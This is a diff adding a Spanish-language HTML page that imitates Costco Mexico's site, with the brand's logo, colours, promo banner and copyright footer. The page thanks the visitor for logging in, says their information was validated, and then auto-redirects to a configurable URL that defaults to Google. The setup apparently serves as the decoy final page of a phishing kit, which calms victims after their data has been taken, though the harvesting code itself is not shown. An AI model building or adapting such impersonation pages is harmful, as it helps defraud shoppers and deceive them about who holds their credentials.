@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Costco - ¡Gracias por iniciar sesión!</title>
+  <!-- Google Fonts: Open Sans matching Costco Sans font metrics and weight exactly -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script type="module">
+    import { CONFIG } from './config.js';
+    window.CONFIG = CONFIG;
+    const redirectBtn = document.getElementById('btn-redirect');
+    if (redirectBtn && CONFIG.REDIRECT_URL) {
+      redirectBtn.href = CONFIG.REDIRECT_URL;
+    }
+  </script>
+
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      color: #333333;
+      background-color: #ffffff;
+      line-height: 1.4;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    a {
+      text-decoration: none;
+      color: inherit;
+    }
+
+    /* 1. TOP PROMO BANNER (Green) */
+    .top-promo-banner {
+      background-color: #00843D;
+      color: #ffffff;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      padding: 9px 16px;
+      letter-spacing: 0.1px;
+    }
+
+    /* 2. TOP NAV UTILITY BAR */
+    .top-utility-bar {
+      background-color: #ffffff;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      padding: 6px 32px;
+      font-size: 13.5px;
+      gap: 22px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .top-utility-bar a {
+      color: #005dab;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      white-space: nowrap;
+    }
+
+    .top-utility-bar a:hover {
+      text-decoration: underline;
+    }
+
+    .top-utility-bar .chevron-down {
+      width: 10px;
+      height: 10px;
+      stroke: #005dab;
+      stroke-width: 2;
+      fill: none;
+    }
+
+    /* 3. MAIN HEADER */
+    .main-header {
+      background-color: #ffffff;
+      padding: 12px 32px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .header-logo img {
+      height: 52px;
+      width: auto;
+      display: block;
+    }
+
+    .header-right-nav {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      font-size: 14.5px;
+      font-weight: 600;
+    }
+
+    .header-right-nav a {
+      color: #005dab;
+    }
+
+    /* 4. NOTICE BARS */
+    .notice-bar-item {
+      background-color: #EEEEEE;
+      color: #333333;
+      padding: 8px 32px;
+      font-size: 13.5px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .notice-bar-item.notice-welcome {
+      font-weight: 700;
+      color: #111111;
+    }
+
+    /* 5. MAIN CONTENT */
+    .thankyou-section-wrap {
+      flex: 1;
+      background-color: #ffffff;
+      padding: 48px 16px 70px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .thankyou-card-container {
+      max-width: 540px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .thankyou-card-frame {
+      background-color: #ffffff;
+      border: 1px solid #d0d0d0;
+      border-radius: 6px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
+      padding: 40px 32px;
+      text-align: center;
+    }
+
+    .success-icon-wrap {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background-color: #E8F5E9;
+      color: #00843D;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .success-icon-wrap svg {
+      width: 40px;
+      height: 40px;
+      stroke: #00843D;
+      stroke-width: 2.5;
+      fill: none;
+    }
+
+    .thankyou-title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #222222;
+      margin-bottom: 12px;
+      letter-spacing: -0.2px;
+    }
+
+    .thankyou-subtitle {
+      font-size: 15.5px;
+      color: #444444;
+      line-height: 1.55;
+      margin-bottom: 20px;
+    }
+
+    .countdown-box {
+      background-color: #F4F8FB;
+      border: 1px solid #D1E4F5;
+      border-radius: 6px;
+      padding: 16px 20px;
+      margin-bottom: 24px;
+      font-size: 15px;
+      color: #333333;
+    }
+
+    .countdown-number {
+      font-size: 22px;
+      font-weight: 800;
+      color: #005dab;
+      display: inline-block;
+      min-width: 28px;
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      height: 6px;
+      background-color: #e0e0e0;
+      border-radius: 3px;
+      overflow: hidden;
+      margin-top: 12px;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 100%;
+      background-color: #005dab;
+      border-radius: 3px;
+      transition: width 1s linear;
+    }
+
+    .btn-continue-now {
+      display: inline-block;
+      background-color: #005dab;
+      color: #ffffff;
+      padding: 12px 36px;
+      font-size: 15.5px;
+      font-weight: 600;
+      border-radius: 4px;
+      transition: background-color 0.15s ease;
+      cursor: pointer;
+    }
+
+    .btn-continue-now:hover {
+      background-color: #004a8c;
+    }
+
+    .card-footer-note {
+      font-size: 13px;
+      color: #777777;
+      margin-top: 20px;
+      border-top: 1px solid #f0f0f0;
+      padding-top: 16px;
+    }
+
+    /* 6. SITE FOOTER */
+    .site-footer-wrap {
+      background-color: #ffffff;
+      border-top: 1px solid #e0e0e0;
+      padding: 24px 32px 18px;
+    }
+
+    .footer-bottom-bar {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      text-align: center;
+      font-size: 13px;
+      color: #555555;
+    }
+
+    .footer-legal-links-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .footer-legal-links-row a {
+      color: #005dab;
+    }
+
+    .footer-legal-links-row a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-copyright-text {
+      color: #777777;
+      font-size: 12px;
+    }
+
+    @media (max-width: 768px) {
+      .top-utility-bar {
+        display: none;
+      }
+      .main-header {
+        padding: 12px 16px;
+      }
+      .header-logo img {
+        height: 42px;
+      }
+      .thankyou-section-wrap {
+        padding: 24px 16px 40px;
+      }
+      .thankyou-card-frame {
+        padding: 30px 20px;
+      }
+      .thankyou-title {
+        font-size: 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Promo Banner -->
+  <div class="top-promo-banner">
+    ¡SOLO HOY! Kenneth Cole Tenis para Caballero a solo $399
+  </div>
+
+  <!-- Top Nav Utility Bar (Desktop) -->
+  <div class="top-utility-bar">
+    <a href="#">Regístrate Ahora</a>
+    <a href="#">Sucursales</a>
+    <a href="#">Atención Al Socio</a>
+    <a href="#">
+      Español
+      <svg class="chevron-down" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+    </a>
+    <a href="#">
+      México
+      <svg class="chevron-down" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+    </a>
+  </div>
+
+  <!-- Main Header -->
+  <header class="main-header">
+    <a href="index.html" class="header-logo">
+      <img src="images/1.png" alt="Costco Wholesale">
+    </a>
+    <div class="header-right-nav">
+      <a href="index.html">Costco.com.mx</a>
+    </div>
+  </header>
+
+  <!-- Notice Bar -->
+  <div class="notice-bar-item notice-welcome">
+    ¡Bienvenido a Costco.com.mx!
+  </div>
+
+  <!-- Main Thank You Content -->
+  <main class="thankyou-section-wrap">
+    <div class="thankyou-card-container">
+      <div class="thankyou-card-frame">
+
+        <!-- Checkmark Icon -->
+        <div class="success-icon-wrap">
+          <svg viewBox="0 0 24 24">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+
+        <h1 class="thankyou-title">¡Gracias por iniciar sesión!</h1>
+
+        <p class="thankyou-subtitle">
+          Tu información ha sido validada exitosamente.
+        </p>
+
+        <!-- Countdown Box -->
+        <div class="countdown-box">
+          Serás redirigido automáticamente a Google en:
+          <br>
+          <span class="countdown-number" id="countdown">10</span> segundos
+          <div class="progress-bar-container">
+            <div class="progress-bar-fill" id="progress-bar"></div>
+          </div>
+        </div>
+
+        <!-- Manual Button -->
+        <a href="https://www.google.com" id="btn-redirect" class="btn-continue-now">
+          Continuar ahora
+        </a>
+
+        <div class="card-footer-note">
+          Si la redirección automática no comienza, haz clic en el botón de arriba.
+        </div>
+
+      </div>
+    </div>
+  </main>
+
+  <!-- Site Footer -->
+  <footer class="site-footer-wrap">
+    <div class="footer-bottom-bar">
+      <div class="footer-legal-links-row">
+        <a href="#">Términos y Condiciones</a>
+        <span>|</span>
+        <a href="#">Aviso de privacidad</a>
+        <span>|</span>
+        <a href="#">Política de Cookies</a>
+      </div>
+      <div class="footer-copyright-text">
+        © Costco de México, S.A. de C.V. 2013 - 2026. Todos los Derechos Reservados.
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const TOTAL_SECONDS = 10;
+    let secondsLeft = TOTAL_SECONDS;
+
+    const countdownEl = document.getElementById('countdown');
+    const progressBarEl = document.getElementById('progress-bar');
+    const redirectBtn = document.getElementById('btn-redirect');
+
+    const redirectUrl = (window.CONFIG && window.CONFIG.REDIRECT_URL) ? window.CONFIG.REDIRECT_URL : 'https://www.google.com';
+    if (redirectBtn) {
+      redirectBtn.href = redirectUrl;
+    }
+
+    const timerInterval = setInterval(() => {
+      secondsLeft--;
+      if (countdownEl) {
+        countdownEl.textContent = secondsLeft;
+      }
+      if (progressBarEl) {
+        const percent = (secondsLeft / TOTAL_SECONDS) * 100;
+        progressBarEl.style.width = percent + '%';
+      }
+
+      if (secondsLeft <= 0) {
+        clearInterval(timerInterval);
+        window.location.href = redirectUrl;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
